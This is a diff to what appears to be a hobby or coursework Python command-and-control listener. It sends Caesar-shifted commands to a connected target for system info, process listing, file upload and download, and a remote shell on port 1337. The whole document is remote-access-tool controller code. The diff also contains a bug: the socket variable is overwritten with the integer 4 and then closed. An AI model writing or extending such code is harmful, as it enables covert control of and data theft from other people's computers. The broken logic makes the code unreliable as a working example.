@@ -29,6 +29,23 @@ def xor(command):
     xored += chr(0)
     return xored
 
+# Text: command
+# s: shift 
+def encrypt(text, s):
+    result = ""
+    # transverse the plain text
+    for i in range(len(text)):
+        char = text[i]
+        # Encrypt uppercase characters in plain text
+        
+        if (char.isupper()):
+            result += chr((ord(char) + s-65) % 26 + 65)
+        # Encrypt lowercase characters in plain text
+        else:
+            result += chr((ord(char) + s - 97) % 26 + 97)
+
+        # print("Inside cipher: "  + )
+    return result
 
 def main():
     # Start listening
@@ -38,17 +55,20 @@ def main():
     print("Listening for connection")
     conn, addr = s.accept()
 
+    s = 4
+
     while(True):
         command = input("476-1337 >>> ")
         if command == "exit":
             print("Peace out bro....")
-            # s.close()
+            s.close()
             exit()
         elif command == "help":
             print('''Here are the available commands: \ninfo: Get general information about the target \nlp: List all running process \nupload <source> <destination>: source is u, destination is where you wanna save it \ndownload <filename>: filename should be the absolute path''')
         elif command == "info":
             print("Getting info from target")
-            result = xor(command)
+            result = encrypt(command, s)
+            print(result)
             conn.send(result.encode())
         # elif command == "upload":
         #     # Ask for source and destination from here
@@ -63,15 +83,20 @@ def main():
         #     print("Downloading file to current directory")
         elif command == "lp":
             print("Listing process....")
-            result = xor(command)
+            result = encrypt(command, s)
+            print(result)
             conn.send(result.encode())
         elif command == "shell":
             # I will have port 1337 open for this
             print("Receiving a shell on port 1337")
-            result = xor(command)
-            conn.send(result.encode())
+            result = encrypt(command, s)
+            print(result)
+            # conn.send(result.encode())
         else:
             print("Command not found!!!")
+
+        # reply = conn.recv(4096)
+        # print("Result:\n " + reply)
 
 
 if __name__ == "__main__":
